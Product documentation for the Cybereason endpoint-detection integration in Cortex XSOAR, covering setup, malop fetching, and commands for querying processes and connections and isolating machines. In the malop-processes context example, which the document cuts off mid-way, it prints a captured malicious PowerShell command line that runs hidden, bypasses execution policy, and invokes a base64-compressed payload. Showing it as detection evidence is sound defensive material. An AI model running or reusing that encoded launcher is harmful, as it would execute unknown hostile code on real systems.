<!-- HTML_DOC -->
<p>Cybereason is an endpoint detection and response platform used through Cortex XSOAR to manage and query malops, connections, and processes.</p>
<p><br> This integration was integrated and tested with Cybereason v17.5.20.</p>
<h2>Important Notes</h2>
<ol>
<li>The integration supports both basic and client-certification authentications.</li>
<li>Decrypt certificate <code>.pfx</code> file outside of Cortex XSOAR.</li>
<li>If you plan to fetch incidents, read the important notes in the <a href="#h_8696566851031544538706749">Fetched Incidents Data</a> section.</li>
<li>Insert the decrypted certificate in the <code>Certificate</code> field under the <strong>Credentials</strong> tab, according to the following template.</li>
</ol>
<pre>Bag Attributes
&lt;ATTRIBUTES&gt;
-----BEGIN CERTIFICATE-----
&lt;CERTIFICATE&gt;
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
&lt;KEY&gt;
-----END RSA PRIVATE KEY-----<br>
</pre>
<h2>Configure Cybereason on Cortex XSOAR</h2>
<ol>
<li>Navigate to <strong>Settings</strong> &gt; <strong>Integrations</strong> &gt; <strong>Servers &amp; Services</strong>.</li>
<li>Search for Cybereason.</li>
<li>Click <strong>Add instance</strong> to create and configure a new integration instance.<br>
<ul>
<li>
<strong>Name</strong>: a textual name for the integration instance.</li>
<li><strong>Server URL (e.g. <a href="https://192.168.0.1/" rel="nofollow">https://192.168.0.1</a>)</strong></li>
<li><strong>Credentials</strong></li>
<li><strong>Trust any certificate (not secure)</strong></li>
<li><strong>Use system proxy settings</strong></li>
<li><strong>Fetch incidents</strong></li>
<li><strong>Incident type</strong></li>
</ul>
</li>
<li>Click <strong>Test</strong> to validate the URLs, token, and connection.</li>
</ol>
<p> </p>
<h2 id="h_8696566851031544538706749">Fetched Incidents Data</h2>
<p>Cortex XSOAR fetches the first batch of Cybereason malops from the previous three days.<br> After the first batch of fetched malops, Cortex XSOAR fetches new Cybereason malops as soon as they are generated in Cybereason.</p>
<p><strong>IMPORTANT</strong>: In order to properly fetch incidents, you need to set the pre-processing script to <em><strong>CybereasonPreProcessing</strong></em> for the incident type you configure in each integration instance. For example, if you select the Malware, you need to configure the pre-processing script for the Malware incident type to <em><strong>CybereasonPreProcessing</strong></em>.</p>
<p><strong>Integration Instance Configuration</strong></p>
<p><img src="https://raw.githubusercontent.com/demisto/content/ca13780e216a39751600dcb1e386d12f52fc8f25/docs/images/Integrations/Cybereason_Cybereason_Fetched_Incidents_2.jpg" alt="Cybereason_Fetched_Incidents_2.jpg"></p>
<p><strong>Malware Indicator Type Configuration</strong></p>
<p><img src="https://raw.githubusercontent.com/demisto/content/adbe33e4dbaa55c40ea737851e421729e4858297/docs/images/Integrations/Cybereason_Cybereason_Fetched_Incidents_1.jpg" alt="Cybereason_Fetched_Incidents_1.jpg"></p>
<h2>Commands</h2>
<p>You can execute these commands from the Cortex XSOAR CLI, as part of an automation, or in a playbook. After you successfully execute a command, a DBot message appears in the War Room with the command details.</p>
<ol>
<li><a href="#h_89560621361536082116536">Search for processes: cybereason-query-processes</a></li>
<li><a href="#h_289781611081536082165685">Check connection to Cybereason server: cybereason-is-probe-connected</a></li>
<li><a href="#h_5216603582071536082175710">Search for connections: cybereason-query-connections</a></li>
<li><a href="#h_8896032513071536082186866">Isolate a machine from the network: cybereason-isolate-machine</a></li>
<li><a href="#h_5633685784041536082253178">Take machine out of isolation: cybereason-unisolate-machine</a></li>
<li><a href="#h_3956058135001536082269607">Get a list and details for all malops: cybereason-query-malops</a></li>
<li><a href="#h_3813627785971536082282877">Get a list of all malops: cybereason-malop-processes</a></li>
<li><a href="#h_7892645756931536082294067">Add a comment to a malop: cybereason-add-comment</a></li>
<li><a href="#h_7664320367841536082302674">Update malop status: cybereason-update-malop-status</a></li>
<li><a href="#h_550371171841544433914048">Prevent a malop process file: cybereason-prevent-file</a></li>
<li><a href="#h_3189997752931544433919989">Allow a malop process file: cybereason-unprevent-file</a></li>
<li><a href="#h_163523643981546507570294">Get information for a file: cybereason-query-file</a></li>
<li><a href="#h_2651126022221546507576262">Get information for a domain: cybereason-query-domain</a></li>
<li><a href="#h_2362030334611546507584634">Get information for a user: cybereason-query-user</a></li>
</ol>
<h3 id="h_89560621361536082116536">1. Search for processes</h3>
<hr>
<p>Searches for processes with various filters.</p>
<h5>Base Command</h5>
<p><code>cybereason-query-processes</code></p>
<h5>Input</h5>
<table style="width: 744px;">
<thead>
<tr>
<th style="width: 175px;"><strong>Argument Name</strong></th>
<th style="width: 442px;"><strong>Description</strong></th>
<th style="width: 91px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 175px;">machine</td>
<td style="width: 442px;">Machine hostname</td>
<td style="width: 91px;">Optional</td>
</tr>
<tr>
<td style="width: 175px;">onlySuspicious</td>
<td style="width: 442px;">Show only suspicious processes</td>
<td style="width: 91px;">Optional</td>
</tr>
<tr>
<td style="width: 175px;">limit</td>
<td style="width: 442px;">Maximum number of results to retrieve</td>
<td style="width: 91px;">Optional</td>
</tr>
<tr>
<td style="width: 175px;">processName</td>
<td style="width: 442px;">Process name to filter by</td>
<td style="width: 91px;">Optional</td>
</tr>
<tr>
<td style="width: 175px;">saveToContext</td>
<td style="width: 442px;">If true, save the result to the context</td>
<td style="width: 91px;">Optional</td>
</tr>
<tr>
<td style="width: 175px;">hasIncomingConnection</td>
<td style="width: 442px;">Filter only processes with incoming connections</td>
<td style="width: 91px;">Optional</td>
</tr>
<tr>
<td style="width: 175px;">hasOutgoingConnection</td>
<td style="width: 442px;">Filter only processes with outgoing connections</td>
<td style="width: 91px;">Optional</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 748px;">
<thead>
<tr>
<th style="width: 305px;"><strong>Path</strong></th>
<th style="width: 416px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 305px;">Process.Name</td>
<td style="width: 416px;">The process name</td>
</tr>
<tr>
<td style="width: 305px;">Process.Malicious</td>
<td style="width: 416px;">Malicious status of the process</td>
</tr>
<tr>
<td style="width: 305px;">Process.CreationTime</td>
<td style="width: 416px;">Process creation time</td>
</tr>
<tr>
<td style="width: 305px;">Process.EndTime</td>
<td style="width: 416px;">Process end time</td>
</tr>
<tr>
<td style="width: 305px;">Process.CommandLine</td>
<td style="width: 416px;">Command line of the process</td>
</tr>
<tr>
<td style="width: 305px;">Process.SignedAndVerified</td>
<td style="width: 416px;">Is the process signed and verified</td>
</tr>
<tr>
<td style="width: 305px;">Process.ProductType</td>
<td style="width: 416px;">Product type</td>
</tr>
<tr>
<td style="width: 305px;">Process.Children</td>
<td style="width: 416px;">Children of the process</td>
</tr>
<tr>
<td style="width: 305px;">Process.Parent</td>
<td style="width: 416px;">Parent process</td>
</tr>
<tr>
<td style="width: 305px;">Process.OwnerMachine</td>
<td style="width: 416px;">Machine hostname</td>
</tr>
<tr>
<td style="width: 305px;">Process.User</td>
<td style="width: 416px;">The user who ran the process</td>
</tr>
<tr>
<td style="width: 305px;">Process.ImageFile</td>
<td style="width: 416px;">Image file of the process</td>
</tr>
<tr>
<td style="width: 305px;">Process.SHA1</td>
<td style="width: 416px;">SHA-1 of the process file</td>
</tr>
<tr>
<td style="width: 305px;">Process.MD5</td>
<td style="width: 416px;">MD5 of the process file</td>
</tr>
<tr>
<td style="width: 305px;">Process.CompanyName</td>
<td style="width: 416px;">Company name</td>
</tr>
<tr>
<td style="width: 305px;">Process.ProductName</td>
<td style="width: 416px;">Product name</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-query-processes machine=DESKTOP-VUO0QPN hasOutgoingConnection=true hasIncomingConnection=true
</pre>
<h5>Context Example</h5>
<pre>{
    "Process": [
        {
            "CommandLine": "C:\\Windows\\system32\\svchost.exe -k LocalService",
            "CompanyName": "Microsoft Corporation",
            "CreationTime": "2018-08-06T23:46:30",
            "EndTime": "2018-08-06T23:45:11",
            "ImageFile": "svchost.exe",
            "MD5": "32569e403279b3fd2edb7ebd036273fa",
            "Malicious": "indifferent",
            "Name": "svchost.exe",
            "OwnerMachine": "DESKTOP-VUO0QPN",
            "Parent": "services.exe",
            "ProductName": "Microsoft® Windows® Operating System",
            "ProductType": "SVCHOST",
            "SHA1": "660b76b6fb802417d513adc967c5caf77fc2bac6",
            "SignedandVerified": "true",
            "User": "desktop-vuo0qpn\\local service"
        }
    ]
}
</pre>
<h5>Human Readable Output</h5>
<h3>Cybereason Processes</h3>
<table style="width: 1952px;">
<thead>
<tr>
<th style="width: 84px;">Name</th>
<th style="width: 74px;">Malicious</th>
<th style="width: 98px;">Creation Time</th>
<th style="width: 100px;">End Time</th>
<th style="width: 237px;">Command Line</th>
<th style="width: 62px;">Signed and Verified</th>
<th style="width: 69px;">Product Type</th>
<th style="width: 66px;">Children</th>
<th style="width: 87px;">Parent</th>
<th style="width: 74px;">Owner Machine</th>
<th style="width: 100px;">User</th>
<th style="width: 84px;">Image File</th>
<th style="width: 334px;">SHA1</th>
<th style="width: 274px;">MD5</th>
<th style="width: 83px;">Company Name</th>
<th style="width: 78px;">Product Name</th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 84px;">svchost.exe</td>
<td style="width: 74px;">indifferent</td>
<td style="width: 98px;">2018-08-06T23:46:30</td>
<td style="width: 100px;">2018-08-06T23:45:11</td>
<td style="width: 237px;">C:\Windows\system32\svchost.exe -k LocalService</td>
<td style="width: 62px;">true</td>
<td style="width: 69px;">SVCHOST</td>
<td style="width: 66px;"> </td>
<td style="width: 87px;">services.exe</td>
<td style="width: 74px;">DESKTOP-VUO0QPN</td>
<td style="width: 100px;">desktop-vuo0qpn\local service</td>
<td style="width: 84px;">svchost.exe</td>
<td style="width: 334px;">660b76b6fb802417d513adc967c5caf77fc2bac6</td>
<td style="width: 274px;">32569e403279b3fd2edb7ebd036273fa</td>
<td style="width: 83px;">Microsoft Corporation</td>
<td style="width: 78px;">Microsoft® Windows® Operating System</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_289781611081536082165685">2. Check connection to Cybereason server</h3>
<hr>
<p>Checks if the machine is currently connected to the Cybereason server.</p>
<h5>Base Command</h5>
<p><code>cybereason-is-probe-connected</code></p>
<h5>Input</h5>
<table style="width: 747px;">
<thead>
<tr>
<th style="width: 178px;"><strong>Argument Name</strong></th>
<th style="width: 413px;"><strong>Description</strong></th>
<th style="width: 117px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 178px;">machine</td>
<td style="width: 413px;">Hostname of the machine to check</td>
<td style="width: 117px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 749px;">
<thead>
<tr>
<th style="width: 236px;"><strong>Path</strong></th>
<th style="width: 52px;"><strong>Type</strong></th>
<th style="width: 420px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 236px;">Cybereason.Machine.isConnected</td>
<td style="width: 52px;">boolean</td>
<td style="width: 420px;">
<em><strong>true</strong></em> if machine is connected, <em><strong>false</strong></em> if machine is not connected</td>
</tr>
<tr>
<td style="width: 236px;">Cybereason.Machine.Name</td>
<td style="width: 52px;">string</td>
<td style="width: 420px;">Machine name</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-is-probe-connected machine=DESKTOP-VUO0QPN
</pre>
<h5>Context Example</h5>
<pre>{
    "Cybereason": {
      "Machine":
        "Name": "DESKTOP-VUO0QPN",
        "isConnected": true
      }
    }
}
</pre>
<h5>Human Readable Output</h5>
<p><code>true</code></p>
<h3 id="h_5216603582071536082175710">3. Search for connections</h3>
<hr>
<p>Searches for connections.</p>
<h5>Base Command</h5>
<p><code>cybereason-query-connections</code></p>
<h5>Input</h5>
<table style="width: 748px;">
<thead>
<tr>
<th style="width: 170px;"><strong>Argument Name</strong></th>
<th style="width: 438px;"><strong>Description</strong></th>
<th style="width: 100px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 170px;">ip</td>
<td style="width: 438px;">Filter connections that contain this IP (in or out)</td>
<td style="width: 100px;">Optional</td>
</tr>
<tr>
<td style="width: 170px;">machine</td>
<td style="width: 438px;">Filter connections on the specified machine</td>
<td style="width: 100px;">Optional</td>
</tr>
<tr>
<td style="width: 170px;">saveToContext</td>
<td style="width: 438px;">If <em><strong>true</strong></em>, save the result to the context</td>
<td style="width: 100px;">Optional</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 747px;">
<thead>
<tr>
<th style="width: 274px;"><strong>Path</strong></th>
<th style="width: 447px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 274px;">Connection.Name</td>
<td style="width: 447px;">Connection name</td>
</tr>
<tr>
<td style="width: 274px;">Connection.Direction</td>
<td style="width: 447px;">OUTGOING/INCOMING</td>
</tr>
<tr>
<td style="width: 274px;">Connection.ServerAddress</td>
<td style="width: 447px;">Address of the Cybereason machine</td>
</tr>
<tr>
<td style="width: 274px;">Connection.ServerPort</td>
<td style="width: 447px;">Port of the Cybereason machine</td>
</tr>
<tr>
<td style="width: 274px;">Connection.PortType</td>
<td style="width: 447px;">Connection type</td>
</tr>
<tr>
<td style="width: 274px;">Connection.ReceivedBytes</td>
<td style="width: 447px;">Received bytes count</td>
</tr>
<tr>
<td style="width: 274px;">Connection.TransmittedBytes</td>
<td style="width: 447px;">Transmitted bytes count</td>
</tr>
<tr>
<td style="width: 274px;">Connection.RemoteCountry</td>
<td style="width: 447px;">Connection's remote country</td>
</tr>
<tr>
<td style="width: 274px;">Connection.OwnerMachine</td>
<td style="width: 447px;">Machine hostname</td>
</tr>
<tr>
<td style="width: 274px;">Connection.OwnerProcess</td>
<td style="width: 447px;">The process that performed the connection</td>
</tr>
<tr>
<td style="width: 274px;">Connection.CreationTime</td>
<td style="width: 447px;">Connection creation time</td>
</tr>
<tr>
<td style="width: 274px;">Connection.EndTime</td>
<td style="width: 447px;">Connection end time</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-query-connections ip=192.168.39.128
</pre>
<h5>Context Example</h5>
<pre>{
    "Connection": [
        {
            "CreationTime": "2018-04-30T18:12:28",
            "Direction": "OUTGOING",
            "Name": "172.16.3.7:48300 \u003e 54.235.96.83:8443",
            "OwnerMachine": "ip-172-16-3-7.ec2.internal",
            "OwnerProcess": "cybereason-sens",
            "RemoteCountry": "United States",
            "ServerAddress": "54.235.96.83",
            "ServerPort": "8443"
        }
    ]
}
</pre>
<h5>Human Readable Output</h5>
<h3>Cybereason Connections</h3>
<table>
<thead>
<tr>
<th style="width: 139px;">Name</th>
<th style="width: 86px;">Direction</th>
<th style="width: 88px;">Server Address</th>
<th style="width: 49px;">Server Port</th>
<th style="width: 41px;">Port Type</th>
<th style="width: 71px;">Received Bytes</th>
<th style="width: 96px;">Transmitted Bytes</th>
<th style="width: 63px;">Remote Country</th>
<th style="width: 98px;">Owner Machine</th>
<th style="width: 81px;">Owner Process</th>
<th style="width: 99px;">Creation Time</th>
<th style="width: 39px;">End Time</th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 139px;">172.16.3.7:48300 &gt; 54.235.96.83:8443</td>
<td style="width: 86px;">OUTGOING</td>
<td style="width: 88px;">54.235.96.83</td>
<td style="width: 49px;">8443</td>
<td style="width: 41px;"> </td>
<td style="width: 71px;"> </td>
<td style="width: 96px;"> </td>
<td style="width: 63px;">United States</td>
<td style="width: 98px;">ip-172-16-3-7.ec2.internal</td>
<td style="width: 81px;">cybereason-sens</td>
<td style="width: 99px;">2018-04-30T18:12:28</td>
<td style="width: 39px;"> </td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_8896032513071536082186866">4. Isolate machine from the network</h3>
<hr>
<p>Isolates a machine that has been infected from the rest of the network</p>
<h5>Base Command</h5>
<p><code>cybereason-isolate-machine</code></p>
<h5>Input</h5>
<table style="width: 746px;">
<thead>
<tr>
<th style="width: 225px;"><strong>Argument Name</strong></th>
<th style="width: 350px;"><strong>Description</strong></th>
<th style="width: 133px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 225px;">machine</td>
<td style="width: 350px;">Machine name to be isolated</td>
<td style="width: 133px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 746px;">
<thead>
<tr>
<th style="width: 286px;"><strong>Path</strong></th>
<th style="width: 108px;"><strong>Type</strong></th>
<th style="width: 314px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 286px;">Cybereason.Machine</td>
<td style="width: 108px;">string</td>
<td style="width: 314px;">Machine name</td>
</tr>
<tr>
<td style="width: 286px;">Cybereason.IsIsolated</td>
<td style="width: 108px;">boolean</td>
<td style="width: 314px;">Is the machine isolated</td>
</tr>
<tr>
<td style="width: 286px;">Endpoint.Hostname</td>
<td style="width: 108px;">string</td>
<td style="width: 314px;">Machine name</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-isolate-machine machine=DESKTOP-VUO0QPN
</pre>
<h5>Context Example</h5>
<pre>{
    "Cybereason": {
        "IsIsolated": true,
        "Machine": "DESKTOP-VUO0QPN"
    },
    "Endpoint": {
        "Hostname": "DESKTOP-VUO0QPN"
    }
}
</pre>
<h5>Human Readable Output</h5>
<p><code>Machine was isolated successfully.</code></p>
<h3 id="h_5633685784041536082253178">5. Take machine out of isolation</h3>
<hr>
<p>Returns a machine that was isolated from the network.</p>
<h5>Base Command</h5>
<p><code>cybereason-unisolate-machine</code></p>
<h5>Input</h5>
<table style="width: 745px;">
<thead>
<tr>
<th style="width: 178px;"><strong>Argument Name</strong></th>
<th style="width: 415px;"><strong>Description</strong></th>
<th style="width: 115px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 178px;">machine</td>
<td style="width: 415px;">Name of machine to take out of isolation</td>
<td style="width: 115px;">Required</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 745px;">
<thead>
<tr>
<th style="width: 278px;"><strong>Path</strong></th>
<th style="width: 121px;"><strong>Type</strong></th>
<th style="width: 309px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 278px;">Cybereason.Machine</td>
<td style="width: 121px;">string</td>
<td style="width: 309px;">Machine name</td>
</tr>
<tr>
<td style="width: 278px;">Cybereason.IsIsolated</td>
<td style="width: 121px;">boolean</td>
<td style="width: 309px;">Is the machine isolated</td>
</tr>
<tr>
<td style="width: 278px;">Endpoint.Hostname</td>
<td style="width: 121px;">string</td>
<td style="width: 309px;">Machine name</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-unisolate-machine machine=DESKTOP-VUO0QPN raw-response=true
</pre>
<h5>Context Example</h5>
<pre>{
    "Cybereason": {
        "IsIsolated": false,
        "Machine": "DESKTOP-VUO0QPN"
    },
    "Endpoint": {
        "Hostname": "DESKTOP-VUO0QPN"
    }
}
</pre>
<h5>Human Readable Output</h5>
<p><code>Machine was un-isolated successfully.</code></p>
<h3 id="h_3956058135001536082269607">6. Get a list and details for all malops</h3>
<hr>
<p>Returns a list and details of all malops.</p>
<h5>Base Command</h5>
<p><code>cybereason-query-malops</code></p>
<h5>Input</h5>
<table style="width: 741px;">
<thead>
<tr>
<th style="width: 147px;"><strong>Argument Name</strong></th>
<th style="width: 488px;"><strong>Description</strong></th>
<th style="width: 73px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 147px;">filters</td>
<td style="width: 488px;">The filters to filter the response by (given in Cybereason API syntax)</td>
<td style="width: 73px;">Optional</td>
</tr>
<tr>
<td style="width: 147px;">totalResultLimit</td>
<td style="width: 488px;">The total number of results to return for your server. To reduce system overload and maximize server performance, make sure the limit is a reasonable number.</td>
<td style="width: 73px;">Optional</td>
</tr>
<tr>
<td style="width: 147px;">perGroupLimit</td>
<td style="width: 488px;">The number of items to return for each malop group</td>
<td style="width: 73px;">Optional</td>
</tr>
<tr>
<td style="width: 147px;">templateContext</td>
<td style="width: 488px;">The level of detail to provide in the response. Possible values include:
<ul>
<li>SPECIFIC: References value contain only the count in the ElementValues class. The Suspicions map is calculated for each results, with the suspicion name and the first time the suspicion appeared. The Evidence map is not calculated for the results.</li>
<li>CUSTOM: Reference values contain the specific Elements, up to the limit defined in the perFeatureLimit parameter. The Suspicions map is not calculated for the results. The Evidence map is not calculated for the results.</li>
<li>DETAILS: Reference values contain the specific Elements, up to the limit defined in the perFeatureLimit parameter. The Suspicions map is calculated for each result, containing the suspicion name and the first time the suspicion appeared. The Evidence map is not calculated for the results.</li>
</ul>
</td>
<td style="width: 73px;">Optional</td>
</tr>
<tr>
<td style="width: 147px;">withinLastDays</td>
<td style="width: 488px;">Return all the malops within the last days</td>
<td style="width: 73px;">Optional</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 745px;">
<thead>
<tr>
<th style="width: 255px;"><strong>Path</strong></th>
<th style="width: 47px;"><strong>Type</strong></th>
<th style="width: 406px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 255px;">Cybereason.Malops.GUID</td>
<td style="width: 47px;">string</td>
<td style="width: 406px;">Malop GUID</td>
</tr>
<tr>
<td style="width: 255px;">Cybereason.Malops.CreationTime</td>
<td style="width: 47px;">string</td>
<td style="width: 406px;">The time reported as when the malicious behavior began on the system. This is not the time the malop was first detected by Cybereason.</td>
</tr>
<tr>
<td style="width: 255px;">Cybereason.Malops.DecisionFeature</td>
<td style="width: 47px;">string</td>
<td style="width: 406px;">The reason that Cybereason raised the malop</td>
</tr>
<tr>
<td style="width: 255px;">Cybereason.Malops.Link</td>
<td style="width: 47px;">string</td>
<td style="width: 406px;">Link to the malop on Cybereason</td>
</tr>
<tr>
<td style="width: 255px;">Cybereason.Malops.Suspects</td>
<td style="width: 47px;">string</td>
<td style="width: 406px;">Malop suspect type and name</td>
</tr>
<tr>
<td style="width: 255px;">Cybereason.Malops.LastUpdatedTime</td>
<td style="width: 47px;">string</td>
<td style="width: 406px;">Last updated time of malop</td>
</tr>
<tr>
<td style="width: 255px;">Cybereason.Malops.AffectedMachine</td>
<td style="width: 47px;">string</td>
<td style="width: 406px;">List of machines affected by this malop</td>
</tr>
<tr>
<td style="width: 255px;">Cybereason.Malops.InvolvedHash</td>
<td style="width: 47px;">string</td>
<td style="width: 406px;">List of file hashes involved in this malop</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-query-malops
</pre>
<h5>Context Example</h5>
<pre>{
    "Cybereason": {
      "Malops" : [
        {
            "CreationTime": "2018-04-30T14:05:14",
            "DecisionFailure": "maliciousExecutionOfPowerShell",
            "GUID": "11.8371241992421952627",
            "LastUpdateTime": "2018-04-30T14:07:29",
            "Link": "https://integration.cybereason.net:8443/#/malop/11.8371241992421952627",
            "Suspects": "Process: powershell.exe"
        }
    ]
  }
}
</pre>
<h5>Human Readable Output</h5>
<h3>Cybereason Malops</h3>
<table>
<thead>
<tr>
<th>GUID</th>
<th>Link</th>
<th>CreationTime</th>
<th>LastUpdateTime</th>
<th>DecisionFailure</th>
<th>Suspects</th>
</tr>
</thead>
<tbody>
<tr>
<td>11.8371241992421952627</td>
<td><a href="https://integration.cybereason.net:8443/#/malop/11.8371241992421952627" rel="nofollow">https://integration.cybereason.net:8443/#/malop/11.8371241992421952627</a></td>
<td>2018-04-30T14:05:14</td>
<td>2018-04-30T14:07:29</td>
<td>maliciousExecutionOfPowerShell</td>
<td>Process: powershell.exe</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_3813627785971536082282877">7. Get a list of all malops</h3>
<hr>
<p>Returns a list of malops.</p>
<h5>Base Command</h5>
<p><code>cybereason-malop-processes</code></p>
<h5>Input</h5>
<table style="width: 749px;">
<thead>
<tr>
<th style="width: 140px;"><strong>Argument Name</strong></th>
<th style="width: 493px;"><strong>Description</strong></th>
<th style="width: 75px;"><strong>Required</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 140px;">malopGuids</td>
<td style="width: 493px;">Array of malop GUIDs (comma-separated). Retrieve the Malop GUID using the <code>cybereason-query-malops</code>.</td>
<td style="width: 75px;">Required</td>
</tr>
<tr>
<td style="width: 140px;">machinename</td>
<td style="width: 493px;">A CSV list of machine names affected by malops, for example, <em>"machine1,machine2"</em>
</td>
<td style="width: 75px;">Optional</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="width: 749px;">
<thead>
<tr>
<th style="width: 269px;"><strong>Path</strong></th>
<th style="width: 93px;"><strong>Type</strong></th>
<th style="width: 346px;"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 269px;">Process.Name</td>
<td style="width: 93px;">string</td>
<td style="width: 346px;">Process name</td>
</tr>
<tr>
<td style="width: 269px;">Process.Malicious</td>
<td style="width: 93px;">unknown</td>
<td style="width: 346px;">Malicious status of the process</td>
</tr>
<tr>
<td style="width: 269px;">Process.CreationTime</td>
<td style="width: 93px;">date</td>
<td style="width: 346px;">Process creation time</td>
</tr>
<tr>
<td style="width: 269px;">Process.EndTime</td>
<td style="width: 93px;">date</td>
<td style="width: 346px;">Process end time</td>
</tr>
<tr>
<td style="width: 269px;">Process.CommandLine</td>
<td style="width: 93px;">string</td>
<td style="width: 346px;">The command line of the process</td>
</tr>
<tr>
<td style="width: 269px;">Process.SignedAndVerified</td>
<td style="width: 93px;">unknown</td>
<td style="width: 346px;">Is the process signed and verified</td>
</tr>
<tr>
<td style="width: 269px;">Process.ProductType</td>
<td style="width: 93px;">unknown</td>
<td style="width: 346px;">Product type</td>
</tr>
<tr>
<td style="width: 269px;">Process.Children</td>
<td style="width: 93px;">unknown</td>
<td style="width: 346px;">Children of the process</td>
</tr>
<tr>
<td style="width: 269px;">Process.Parent</td>
<td style="width: 93px;">unknown</td>
<td style="width: 346px;">Parent process</td>
</tr>
<tr>
<td style="width: 269px;">Process.OwnerMachine</td>
<td style="width: 93px;">unknown</td>
<td style="width: 346px;">Machine hostname</td>
</tr>
<tr>
<td style="width: 269px;">Process.User</td>
<td style="width: 93px;">string</td>
<td style="width: 346px;">The user who ran the process</td>
</tr>
<tr>
<td style="width: 269px;">Process.ImageFile</td>
<td style="width: 93px;">unknown</td>
<td style="width: 346px;">Image file of the process</td>
</tr>
<tr>
<td style="width: 269px;">Process.SHA1</td>
<td style="width: 93px;">string</td>
<td style="width: 346px;">SHA-1 of the process file</td>
</tr>
<tr>
<td style="width: 269px;">Process.MD5</td>
<td style="width: 93px;">string</td>
<td style="width: 346px;">MD5 of the process file</td>
</tr>
<tr>
<td style="width: 269px;">Process.CompanyName</td>
<td style="width: 93px;">string</td>
<td style="width: 346px;">Company name</td>
</tr>
<tr>
<td style="width: 269px;">Process.ProductName</td>
<td style="width: 93px;">string</td>
<td style="width: 346px;">Product name</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<pre>!cybereason-malop-processes malopGuids=11.8371241992421952627
</pre>
<h5>Context Example</h5>
<pre>{
    "Process": [
        {
            "CommandLine": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('nVRtc9o4EP7Or9jx6GbsCVbMS2mCJzOl0LTcFZoLtOkdw9wIW2AXWXJkGUwo//3W4CP0632xvNLuPs+unhV5hjt4Z9VmAyGGSaq0sa0115KLVpOGQljOHNJ8IeIAMsMMLrwweA5DaR6Mhm+xNjkTPSFUYFd7Iu2FoeZZVoc8lgbC7SR+4ZWxPPliKiWnu/R1+0ErwwPj+P+bS19zZvg0wiV85XKye8boeJEbfkHKsGB9YnZ2xj1tzuzP2w9Ms4Qj1jn4iIUl3Au2uvQ8oQ1DLMN6VzN6tychdtjqve8PPtx//DT8/Y/Po/GXhz8fJ9Ov356+//U3WwQhX66i+MdaJFKlzzoz+WZb7F68RrPVftN5e3Nr0anqR0z3tGY726ktcxmU6BDYZOPsQXOTYx9se4bsZvM5kM2vEfATRpxluebul8UPbDO4kzxxKH7gN/CKhueBy5/htukcXrMb2JNlyd7yG5S2fi4VFhdErjqmwLOrOyDhzF5x42omQ5WAm7AiTjArCelnLlcmcuYHv+JHlv5Fdg57SLUKsNWwn7GS6JwUCIefKyD/HHzgMkQKBbLPUA0VLuxtybf/GY9HXIdK1ILtHA4XAKs9IGOwSXzn+SQGVxjotPHv6srZkwiRjE/WJWCICNwHqArEEAEx8l2jX1Y6RCUj4UO8BBt7njkOnLuOHghbGdbt5vtXC8skCcaNkWfV78kuMzyhY27oE1/0Rcwloif0E8qF64yi6Gwrz7h22QqPrDpYI/USC8Gu29RDVJWkqLiFQJ6jyfADdGjDh6cYq99mMJ46llMjEjFXPsze7ww/yiAtySd0oLZSKBYOmGG2FRmTdq+vG7dN2ujcUI82vJtuu926JtICzKIwCOm45XjihfJkwfWAL2MZH9tKnsEd4ziAheitpgWuRCtLWcDhuHNfXUAGbsqyzEQ6r5Hijqhu95fnwquTtBJJ3Stanufh0vYcf1Y16zGXJk44xeniWqUTrjcxyoWOmM4iJubdbl+lO5ukdfDqMDsN4dwmBYofjVbTdpw6nEHK0jDk8pVAxDop6uXilUOicuPKXOBNH18CdyI4T3FWeKBQijedtucd8O0Kov3hXw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"",
            "CompanyName": "Microsoft Corporation",
